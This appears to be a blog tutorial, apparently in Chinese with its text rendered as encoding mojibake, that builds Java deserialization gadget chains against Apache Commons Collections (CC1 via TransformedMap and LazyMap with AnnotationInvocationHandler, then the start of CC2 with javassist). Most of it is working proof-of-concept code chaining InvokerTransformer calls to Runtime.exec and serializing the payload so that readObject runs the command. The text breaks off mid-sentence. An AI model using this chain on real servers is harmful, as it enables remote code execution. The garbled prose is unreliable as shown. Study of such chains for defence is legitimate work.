è¿›å»ï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº† POCå¦‚ä¸‹ 12345678910111213141516package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1Tester &#123; public static void main(String[] args) &#123; Runtime runtime = Runtime.getRuntime(); //è¿™é‡Œæ ¹æ®å®šä¹‰çš„å†…å®¹ä¼ å…¥å¯¹åº”çš„å‚æ•°ï¼Œå…¶å®ä¹Ÿæ˜¯åå°„ä¸­è°ƒç”¨ç±»ä¸­å‡½æ•°çš„å‚æ•° InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;); invokerTransformer.transform(runtime); &#125; &#125; æ‰§è¡Œç»“æœå¯ä»¥çœ‹åˆ°æˆåŠŸçš„å¼¹å‡ºäº†è®¡ç®—æœºï¼Œä½†æ˜¯åºåˆ—åŒ–çš„æ—¶å€™åªèƒ½åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè¿™ä¸ªå¯¹è±¡å¦‚æœæ˜¯ä¼ å…¥äº†æˆ‘ä»¬çš„payloadä»£ç ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¦‚æœæœåŠ¡ç«¯åé¢æ²¡æœ‰ç”¨æˆ‘ä»¬ä¼ å…¥æ¶æ„ä»£ç çš„InvokerTransformerå¯¹è±¡çš„transformæ–¹æ³•ä¼ å…¥ä¸€ä¸ªRuntimeç±»å‹çš„ä»£ç ï¼Œé‚£ä¹ˆè¿˜æ˜¯æ²¡æœ‰åŠæ³•æ‰§è¡Œä»»æ„å‘½ä»¤ è¿˜éœ€è¦å®ç°çš„ç›®çš„å¦‚ä¸‹ æ‰¾åˆ°ç›´æ¥è°ƒç”¨InvokerTransformerç±»çš„transformæ–¹æ³•çš„å¯¹è±¡æˆ–è€…æ˜¯æ–¹æ³• æ‰¾åˆ°payload å¥½éš¾âŠ™ï¹âŠ™âˆ¥å‘œå‘œå‘œ~~~ ChainedTransformerå› ä¸ºéœ€è¦å¯»æ‰¾è°ƒç”¨transformæ–¹æ³•çš„ç±»ï¼Œæ‰€ä»¥è½¬åˆ°Transformeræ¥å£ä¸­ï¼Œé¼ æ ‡é€‰ä¸­transformæ–¹æ³•ï¼ŒæŒ‰ä½ctrl+alt+Bï¼Œå‘ç°äº†æœ‰ä¸€ä¸ªChainedTransformerçš„ç±»ä¸­çš„transformeræ–¹æ³•å¦‚ä¸‹ 123456public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125; å…¶ä¸­iTransformersæ˜¯åˆ›å»ºå¯¹è±¡æ—¶ä¼ å…¥çš„Transformer[]ç±»å‹çš„æ•°æ® è¿™ä¸ªå‡½æ•°åŠŸèƒ½æ˜¯ä»ä¼ å…¥çš„Transformeræ•°ç»„ä¸­æ‰§è¡Œæ¯ä¸€ä¸ªçš„transformæ–¹æ³•ï¼Œå¹¶ä¸”å°†å‰é¢ä¸€ä¸ªçš„è¿”å›ç»“æœä¼ å…¥åé¢ä¸€ä¸ªå¯¹è±¡çš„transformæ–¹æ³•ä¸­ï¼Œç„¶åæœ€åè¿”å›æœ€åä¸€ä¸ªå¯¹è±¡çš„transformå‡½æ•°æ‰§è¡Œçš„ç»“æœ è¿™é‡Œè§£å†³äº†æˆ‘ä»¬çš„æ‰§è¡ŒInvokerTransformerå¯¹è±¡çš„transformæ–¹æ³•çš„é—®é¢˜ ä½¿ç”¨è¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•çš„è¯ï¼Œåªè¦æœåŠ¡ç«¯æœ‰æ‰§è¡ŒChainedTransformerå¯¹è±¡çš„transformæ–¹æ³•çš„è¯å°±ä¼šè§¦å‘rce 1234567891011121314151617package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1Tester &#123; public static void main(String[] args) &#123; //å› ä¸ºæ¥å£ä¸èƒ½ç›´æ¥åˆ›å»ºå¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨çš„æ˜¯åŒ¿åå†…éƒ¨ç±»çš„å†™æ³•åˆ›å»ºå¯¹è±¡ Transformer[] transformers= new Transformer[]&#123;new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.getRuntime()); &#125; &#125; å®ç°æ•ˆæœå¦‚ä¸‹ä½†æ˜¯è¿™æ ·ååºåˆ—åŒ–åï¼Œè¿˜æ˜¯éœ€è¦æœåŠ¡ç«¯æ‰§è¡ŒchainedTransformer.transform(Runtime.getRuntime()); è¿™å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¦æ‰¾åˆ°ä¸€ä¸ªç±»æ—¢æœ‰transformæ–¹æ³•ï¼Œä¸”ä¼ å…¥InvokerTransformerå¯¹è±¡çš„transformæ–¹æ³•çš„å€¼æ˜¯Runtime.getRuntime()å¯¹è±¡ ConstantTransformeræ‰¾åˆ°ConstantTransformerå¯¹è±¡çš„transformæ–¹æ³•ï¼Œä½œç”¨æ˜¯è¿”å›ä¼ å…¥çš„å¯¹è±¡ å¦‚æœé‡‡ç”¨è¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•çš„è¯ï¼Œé‚£ä¹ˆä¸Šé¢çš„é—®é¢˜å°±å¯ä»¥è§£å†³ä¸€åŠäº† POCä»£ç å¦‚ä¸‹ 1234567891011121314import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class CC1Tester &#123; public static void main(String[] args) &#123; Transformer[] transformers= new Transformer[]&#123;new ConstantTransformer(Runtime.getRuntime()),new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(111); &#125; &#125; è¿™é‡Œåªæ˜¯åˆ©ç”¨åŒ¿åç±»çš„æ–¹æ³•å°†ConstantTransformerå¯¹è±¡ä¼ å…¥Transformer[]æ•°ç»„ä¸­ï¼Œç„¶åè¿”å›çš„å€¼å°±æ˜¯Runtimeç±»å‹çš„ï¼Œç„¶åä¼ å…¥åé¢çš„transformæ–¹æ³•ï¼Œä¹Ÿå°±æ‰§è¡Œæ¶æ„ä»£ç äº† æ‰§è¡Œç»“æœ å¦‚æ­¤ï¼Œåªè¦æˆ‘ä»¬å°†ChainedTransformerå¯¹è±¡åºåˆ—åŒ–ï¼Œç„¶åä¼ ç»™æœåŠ¡ç«¯ï¼Œä¸”æœåŠ¡ç«¯å­˜åœ¨æ“ä½œChainedTransformerçš„transformæ–¹æ³•çš„å‘½ä»¤ï¼Œé‚£ä¹ˆå°±åˆ©ç”¨æˆåŠŸäº†ï¼Œä½†æ˜¯è¿™æ ·åˆ©ç”¨è¿˜æ˜¯æœ‰ç‚¹éš¾ä»¥å®ç°ï¼Œå¦‚æœç›´æ¥ååºåˆ—åŒ–å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç å°±å®Œç¾äº† åœ¨è§£å†³è¿™ä¸ªé—®é¢˜ä¹‹å‰è¿˜æœ‰ä¸€ä¸ªé—®é¢˜éœ€è¦è§£å†³ï¼Œå°±æ˜¯Runtimeä¸èƒ½å¤Ÿè¢«åºåˆ—åŒ–ï¼Œå› ä¸ºä»–æ²¡æœ‰å®ç°Serializableæ¥å£ è§£å†³Runtimeåºåˆ—åŒ–é—®é¢˜è¿™é‡Œå› ä¸ºæœ‰InvokerTransformerç±»çš„å­˜åœ¨ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘å¦‚ä¸‹æ–¹æ³•ï¼š é¦–å…ˆï¼Œåœ¨ChainedTransformerå¤§æ¡†æ¶ä¸‹é¢ï¼Œåˆ©ç”¨ConstantTransformerå°†Classç±»çš„Runtimeä¼ å…¥InvokerTransformerçš„transformæ–¹æ³•ä¸­ï¼Œåˆ©ç”¨å…¶åå°„çš„åŠŸèƒ½è°ƒç”¨getMethodæ–¹æ³•ï¼Œè·å–Runtimeçš„getRuntimeæ–¹æ³•çš„Methodå¯¹è±¡ï¼Œç„¶åå†ä½¿ç”¨InvokerTransformerçš„transformæ–¹æ³•æ‰§è¡ŒRuntime.getRuntimeå‘½ä»¤ï¼Œç„¶åå°†Runtimeå¯¹è±¡ä¼ ç»™ä¸‹ä¸€ä¸ªInvokerTransformerçš„transformæ–¹æ³•ï¼Œç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ æ€è·¯ï¼š InvokerTransformer1â€”â€”&gt;è·å–getRuntimeçš„Methodå¯¹è±¡InvokerTransformer2â€”â€”&gt;è·å–Rumtimeå¯¹è±¡InvokerTransformer3â€”â€”&gt;æ‰§è¡ŒRumtimeå¯¹è±¡çš„execå‘½ä»¤ InvokerTransformeråœ¨è¿™æ€ä¸ªè¿‡ç¨‹ä¸­ç›¸å½“äºä¸€ä¸ªä»£ç†ï¼Œé€šè¿‡è¿™ä¸ªå¯¹è±¡ä¸­çš„transformæ–¹æ³•æ¥è°ƒç”¨ æ­£å¸¸çš„åå°„å†™æ³•ï¼š 12345Class cls = Runtime.class; Method getRuntimeMethod = cls.getMethod(&quot;getRuntime&quot;,null); Runtime r =(Runtime) getRuntimeMethod.invoke(null,null); Method execMethod = cls.getMethod(&quot;exec&quot;, String.class); execMethod.invoke(r,&quot;calc.exe&quot;); ä½¿ç”¨InvokerTransformerçš„å†™æ³•ï¼š 12345678910Transformer[] transformers= new Transformer[]&#123;new ConstantTransformer(Runtime.class), //æ‰§è¡Œä¸‹é¢è¿™æ¡è¯­å¥å¾—åˆ°getRuntimeæ–¹æ³•çš„Methodå¯¹è±¡å¹¶ä¸”ä¼ å…¥ä¸‹ä¸€æ¡è¯­å¥,getMethodæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå‚æ•°ä¹Ÿéœ€è¦2ä¸ª new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), //æ‰§è¡Œä¸‹é¢è¿™æ¡è¯­å¥ç›¸å½“äºgetRuntimeMethod.invoke(null,null)ï¼Œä¹Ÿå°±æ˜¯ä¼šç›´æ¥æ‰§è¡ŒRuntime.getRuntime()ï¼Œç„¶åè¿”å›Runtimeå¯¹è±¡ç»™ä¸‹ä¸€æ¡è¯­å¥ new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //æ‰§è¡Œä¸‹é¢è¿™è¯­å¥ç›¸å½“äºæ‰§è¡ŒexecMethod.invoke(r,&quot;calc.exe&quot;) new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(111); è¿™é‡Œçš„å‚æ•°ä¸€å®šè¦å†™å¯¹ï¼Œå¦åˆ™æ˜¯å¤ç°ä¸æˆåŠŸçš„ï¼Œè‡³æ­¤Runtimeåºåˆ—åŒ–çš„äº‹æƒ…è§£å†³ã€‚ è§£å†³transformå‡½æ•°æ‰§è¡Œé—®é¢˜æœ€ç»ˆæˆ‘ä»¬æ˜¯è¦å›åˆ°readObjectæ–¹æ³•çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€å±‚å±‚çš„å¾€ä¸Šæ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°ç›´æ¥è¢«readObjectè°ƒç”¨ é¼ æ ‡åœç•™åœ¨transformå‡½æ•°ä¸Šé¢ï¼Œç„¶åæŸ¥æ‰¾ç”¨æ³• ç„¶åç‚¹å‡»è®¾ç½®å›¾æ ‡å°±å¯ä»¥é€‰æ‹©ä½œç”¨åŸŸ æ‰¾åˆ°TransformedMapç±»ä¸­æœ‰å¤šä¸ªè°ƒç”¨transformæ–¹æ³•çš„å‡½æ•° åˆ†ææŸ¥çœ‹è¯¥ç±» å¯ä»¥çœ‹åˆ°è¿™ä¸ªtransformKeyå‡½æ•°å¯¹keyTransformerè¿›è¡Œæ“ä½œï¼Œè‹¥æ˜¯ä¸ä¸ºnullçš„è¯å°±è°ƒç”¨transformæ–¹æ³• æŸ¥çœ‹keyTransformeræ˜¯ä»€ä¹ˆ å¯ä»¥çœ‹åˆ°keyTransformeræ˜¯ä¸€ä¸ªTransformerç±»å‹çš„æˆå‘˜å˜é‡ï¼Œå¯ä»¥è¢«æˆ‘ä»¬æ‰€æ§åˆ¶ï¼Œåªè¦åˆ›å»ºå¯¹è±¡æ—¶å°±å¯ä»¥ä¼ å…¥ï¼Œç„¶åæŒ‰ç…§æ€è·¯ç¼–å†™ä»£ç å¦‚ä¸‹ 12345Map map = new HashMap&lt;&gt;(); TransformedMap transformedMap = new TransformedMap(map,chain,null); transformedMap.transformKey(111);//chainæ˜¯ä¸Šé¢ç¼–å†™çš„ï¼Œå¯å‚è€ƒä¸Šé¢ ä½†æ˜¯TransformedMapçš„æ„é€ æ–¹æ³•æ˜¯æœ‰protectä¿®é¥°çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå¹¸å¥½é‡Œé¢æœ‰ä¸€ä¸ªpublicä¿®é¥°çš„decorateæ–¹æ³•å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„TransformedMapå¯¹è±¡ æŸ¥çœ‹å¹¶åˆ†ædecorateæ–¹æ³• 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer); &#125; decorateæ–¹æ³•çš„æœ€åä¸€ä¸ªå‚æ•°æ˜¯valueTransformerï¼Œkeyå°±å†™nullå°±è¡Œäº†ï¼Œè¿™ä¸ªvalueTransformerå°±ä¼ chain tipï¼šç”¨è¿™ä¸ªæ–¹æ³•ç›¸å½“äºMap map &#x3D; new TransformedMap(â€”)ï¼Œä¹Ÿå°±æ˜¯å¤šæ€çš„å†™æ³• æ‰€ä»¥ä»£ç å¯ä»¥è¿™æ ·ç¼–å†™ï¼š 123Map map = new HashMap&lt;&gt;(); Map transformedMap = TransformedMap.decorate(map,null,chain); transformedMap.trasformValue(111); ä½†æ˜¯trasformValueæ–¹æ³•æ˜¯protectçš„ï¼Œä¸èƒ½è°ƒç”¨ï¼Œåªèƒ½å¯»æ‰¾å¯ä»¥ç›´æ¥ä½¿ç”¨çš„è°ƒç”¨trasformValueæ–¹æ³•çš„æ–¹æ³• æœ€åæ‰¾åˆ°putæ–¹æ³• æŸ¥çœ‹å¹¶ä¸”åˆ†æputæ–¹æ³• å¯ä»¥çœ‹åˆ°åªè¦è°ƒç”¨putå°±ä¼šè°ƒç”¨transformValueæ–¹æ³•ï¼Œäºæ˜¯ä»£ç å¯ä»¥è¿™æ ·å†™ï¼š 123456789ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;); Map map = new HashMap&lt;&gt;(); Map transformedMap = TransformedMap.decorate(map,null,chain); transformedMap.put(null,111); ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æœåŠ¡ç«¯å°†ååºåˆ—åŒ–çš„å¯¹è±¡è½¬æ¢æˆMapç±»å‹ï¼Œç„¶åæ‰§è¡Œäº†putæ–¹æ³•å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ è¿˜æ˜¯ä¸å¤Ÿå•Šï¼Œéœ€è¦ç›´æ¥ä½¿ç”¨readObjectååºåˆ—åŒ–åç›´æ¥æ‰§è¡Œå‘½ä»¤æ‰è¡Œå•Š å› ä¸ºMapçš„putæ“ä½œæ¯”è¾ƒå¸¸è§ï¼Œæ¢ä¸ªæ€è·¯ï¼Œä»readObjectç«¯æ€è€ƒï¼Œç°åœ¨åªéœ€è¦æ‰¾åˆ°readObjectç›´æ¥è°ƒç”¨putæ–¹æ³•çš„ç±»å°±å¯ä»¥äº† æ²¡æœ‰æ‰¾åˆ°ï¼Œæ‰¾åˆ°æ‰€æœ‰çš„å¯¹Mapå¯¹è±¡è¿›è¡Œæ“ä½œçš„ç±»ï¼Œè½¬åˆ°Mapçš„ç”¨æ³•ï¼Œæ‰¾åˆ°æ–¹æ³•å½¢å‚ æ‰¾åˆ°äº†AnnotationInvocationHandlerç±»çš„æ„é€ æ–¹æ³•æ˜¯ä¼ ä¸€ä¸ªMapå¯¹è±¡çš„ æ‰¾åˆ°è¯¥ç±»çš„readObjectæ–¹æ³•ï¼Œå‘ç°æœ‰å¯¹Mapå¯¹è±¡è¿›è¡Œæ“ä½œ memberValueå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å€¼,readObjectæ–¹æ³•ä¸­æœ‰ä¸€ä¸ªæ“ä½œå¦‚ä¸‹ 123456789101112131415for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125; ä½†æ˜¯çœ‹ä¸Šé¢çš„æ“ä½œï¼Œå‘ç°ä¼šå¯¹Mapå¯¹è±¡ä½¿ç”¨getæ“ä½œï¼Œè¿™æ—¶å€™æˆ‘ä»¬åªè¦æ‰¾åˆ°å¯¹getæ–¹æ³•æ“ä½œæœ‰è°ƒç”¨transformå‡½æ•°çš„å³å¯ï¼Œè¿™æ—¶å€™è½¬åˆ°tranformç”¨æ³•ï¼Œå‘ç°äº†LazyMapä¸­æœ‰ä½¿ç”¨getå‡½æ•°è°ƒç”¨transformå‡½æ•° ç„¶åå‘ç°äº†LazyMapä¸­ä¹Ÿæœ‰decorateæ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•å’ŒTransformedMapä¸€æ ·çš„åŠŸèƒ½ï¼Œæ–°åˆ›å»ºäº†ä¸€ä¸ªLazyMapå¯¹è±¡ å¦‚æ­¤ï¼Œåˆ©ç”¨é“¾ä¾¿æ¸…æ™°äº†_ å®Œæ•´POCå¦‚ä¸‹ 123456789101112131415161718ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;); // chain.transform(111); Map map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;key&quot;); Map transformmap = TransformedMap.decorate(map,null,chain); //å› ä¸ºAnnotationInvocationHandlerçš„æ„é€ æ–¹æ³•å’Œå‚æ•°ä¸æ˜¯publicã€‚æ‰€ä»¥éœ€è¦ä½¿ç”¨åå°„æ¥è°ƒç”¨ Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class); handler_constructor.setAccessible(true); Object instance = handler_constructor.newInstance(Target.class,transformmap); FileOutputStream fileOutputStream = new FileOutputStream(&quot;D:\\\\Desktop\\\\JavaTester\\\\CC1\\\\src\\\\main\\\\java\\\\org\\\\example\\\\ser.txt&quot;); ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream); outputStream.writeObject(instance); outputStream.close(); fileOutputStream.close(); æ‰§è¡Œä»¥ä¸Šçš„ä»£ç åæ‰§è¡Œä»¥ä¸‹ååºåˆ—åŒ–ä»£ç  12345FileInputStream fileInputStream = new FileInputStream(&quot;D:\\\\Desktop\\\\JavaTester\\\\CC1\\\\src\\\\main\\\\java\\\\org\\\\example\\\\ser.txt&quot;); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); objectInputStream.close(); fileInputStream.close(); æ³¨æ„ï¼šè‹¥æ˜¯è¿è¡Œå‡ºç°javaæºé”™è¯¯ï¼Œå¯ä»¥ä¿®æ”¹è®¾ç½®ä¸­çš„javaå­—èŠ‚ç‰ˆæœ¬åˆ°ç›¸åº”çš„ç‰ˆæœ¬ï¼Œç„¶åé¡¹ç›®ç»“æ„ä¸­çš„æ¨¡å—çš„è¯­è¨€ç»“æ„ä¹Ÿæ”¹æˆç›¸åº”ç»“æ„å³å¯ ä»£ç è§£é‡Šmap.put(â€œvalueâ€,â€keyâ€);è¿™é‡Œçš„é”®ä¸€å®šè¦æ˜¯valueï¼Œå€¼çš„è¯éšä¾¿ å› ä¸ºåœ¨AnnotationInvocationHandlerä¸­è¦å…ˆåˆ¤æ ¹æ®é”®çš„ç±»å‹æ˜¯å¦æ˜¯ç©ºå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯Targetæ³¨è§£ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢åªæœ‰value æ‰€ä»¥éœ€è¦ä¼ å…¥valueï¼Œç„¶åå°±ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œç›´åˆ°è°ƒç”¨setValueï¼Œç„¶ååˆå› ä¸ºtransformerMapç»§æ‰¿äºAbstractInputCheckedMapDecoratoræ¥å£ï¼Œç„¶åé‡Œé¢é‡å†™äº†MapEntryç±»çš„setValueæ–¹æ³• ç„¶åé‡Œé¢åˆè°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œäºæ˜¯å°±æ‰§è¡Œtransformæ–¹æ³• è‡³æ­¤ï¼Œåˆ©ç”¨é“¾å®Œæˆ Lazymapé“¾ä¸Šé¢ç”¨åˆ°TransformedMapæ˜¯ä¸ºäº†è§£å†³transformå‡½æ•°è°ƒç”¨é—®é¢˜ï¼ŒLazymapç±»ä¹Ÿå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè€Œä¸”ysoserialä¹Ÿæ˜¯ç”¨çš„è¿™ä¸ªæ–¹æ³•ï¼Œä¸‹é¢å°±åˆ†æä¸€ä¸‹ é¦–å…ˆæ‰¾åˆ°äº†getæ–¹æ³•å¯ä»¥è°ƒç”¨transformæ–¹æ³•ï¼Œè€Œfactoryå˜é‡æ˜¯ç”±æˆ‘ä»¬æ§åˆ¶çš„ï¼Œå°±æ˜¯ä¼ åˆ›å»ºå¯¹è±¡æ—¶ä¼ å…¥çš„Mapå¯¹è±¡ é‡Œé¢æœ‰ä¸€ä¸ªdecorateæ–¹æ³•å’ŒTransformedMapç±»ä¸­çš„decorateæ–¹æ³•ä¸€æ ·ä¹Ÿæ˜¯å¸®åŠ©æˆ‘ä»¬åˆ›å»ºLazymapå¯¹è±¡çš„ï¼Œæ‰€ä»¥æŒ‰ç…§å‚æ•°åˆ›å»ºå³å¯ï¼Œå¦‚æ­¤åªè¦ç”±readObjectè°ƒç”¨Mapçš„getæ–¹æ³•å³å¯å®ç°è°ƒç”¨transformæ–¹æ³•ï¼Œå³å¯æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„å‘½ä»¤ AnnotationInvocationHandlerç±»ä¸­çš„Invokeæ–¹æ³•åˆšå¥½æœ‰è°ƒç”¨getæ–¹æ³• AnnotationInvocationHandlerå®ç°äº†InvocationHandlerï¼Œç”±åŠ¨æ€ä»£ç†çš„çŸ¥è¯†å¯ä»¥æƒ³åˆ°AnnotationInvocationHandlerå¯ä»¥å»ºç«‹åŠ¨æ€ä»£ç† ç„¶åå‘ç°åœ¨readObjectä¸­è°ƒç”¨äº†Mapå¯¹è±¡çš„entrySetæ–¹æ³•ç”±æ­¤å¯ä»¥çŸ¥é“ï¼Œåªè¦AnnotationInvocationHandlerå»ºç«‹Mapçš„åŠ¨æ€ä»£ç†ï¼Œç„¶åå°†åŠ¨æ€ä»£ç†å¯¹è±¡ä½œä¸ºMapå¯¹è±¡ä¼ å…¥æ–°çš„AnnotationInvocationHandlerå¯¹è±¡ä¸­ï¼Œç­‰åˆ°æ‰§è¡ŒmemberValues.entrySet()æ—¶å°±ä¼šå…ˆå»AnnotationInvocationHandlerä¸­çš„involkeä¸­æ‰§è¡Œgetæ–¹æ³•ï¼Œç„¶åå†å›åˆ°LazyMapçš„getï¼Œå°±æ‰§è¡Œäº†transform ğŸ‰ä»£ç å®ç°å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, InstantiationException &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)&#125;); Map map = new HashMap&lt;&gt;(); Map lazymap = LazyMap.decorate(map,chain);//ä½¿ç”¨decorateåˆ›å»ºå¯¹è±¡ //å› ä¸ºAnnotationInvocationHandlerå¯¹è±¡çš„æ„é€ æ–¹æ³•ç”±protectä¿®é¥°ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨åå°„æ¥åˆ›å»ºå¯¹è±¡ Constructor constructor1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); constructor1.setAccessible(true); //åˆ›å»ºMapç±»çš„ä»£ç†å¯¹è±¡ InvocationHandler InProxy = (InvocationHandler)constructor1.newInstance(Override.class,lazymap); //è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€èˆ¬æ˜¯Obj.getClass().getClassLoader()ï¼Œä½†æ˜¯ClassLoader.getSystemClassLoader()ä¹Ÿæ²¡ä»€ä¹ˆå½±å“ Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,InProxy); //åˆ›å»ºæ–°çš„AnnotationInvocationHandlerå¯¹è±¡ï¼Œå¹¶ä¸”å°†proxyMapä¼ å…¥ Object handler = constructor1.newInstance(Override.class,proxyMap); FileOutputStream fileOutputStream = new FileOutputStream(&quot;D:\\\\Desktop\\\\JavaTester\\\\CC1\\\\src\\\\main\\\\java\\\\org\\\\example\\\\ser.txt&quot;); ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream); outputStream.writeObject(handler); outputStream.close(); fileOutputStream.close(); &#125; æ‰§è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–åä¼šæŠ¥é”™ï¼Œä½†æ˜¯å·²ç»æˆåŠŸæ‰§è¡Œå‘½ä»¤äº†ï¼Œæ‰€ä»¥åˆ©ç”¨æˆåŠŸ Common Collection2 å‚è€ƒé“¾æ¥ï¼šhttps://www.yuque.com/tianxiadamutou/zcfd4v/fw3ag3 ç¯å¢ƒï¼šjava8ã€CommonsCollections 4.0 å‰è¨€âœ¨éœ€è¦æŒæ¡çš„å‰ç½®çŸ¥è¯†ï¼šjavasistï¼ŒClassLoader#defineClassï¼ŒTemplatesImpl javasistæ˜¯ä¸€ä¸ªå¤„ç†å­—èŠ‚ç çš„ç±»åº“ï¼Œèƒ½å¤ŸåŠ¨æ€çš„ä¿®æ”¹classä¸­çš„å­—èŠ‚ç ä¸ºäº†ä»‹ç»è¿™ä¸ªç±»ã€‚æ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œå¯¼å…¥è¿™ä¸ªä¾èµ–ï¼Œå¯¼å…¥ä¾èµ–ä»£ç å¦‚ä¸‹ 12345&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.25.0-GA&lt;/version&gt;&lt;/dependency&gt; ä½¿ç”¨æ­¥éª¤1ã€æ–°å»ºClassPool ClassPool pool &#x3D; ClassPool.getDefault(); 2ã€æŒ‡å®šç±»æœç´¢è·¯å¾„ pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); 3ã€åˆ›å»ºä¸€ä¸ªclassæ–‡ä»¶å¯¹è±¡ CtClass test &#x3D; pool.makeClass(â€œEvilâ€); é‡æ–°è®¾ç½®åç§° String name &#x3D; â€œEvilâ€ + 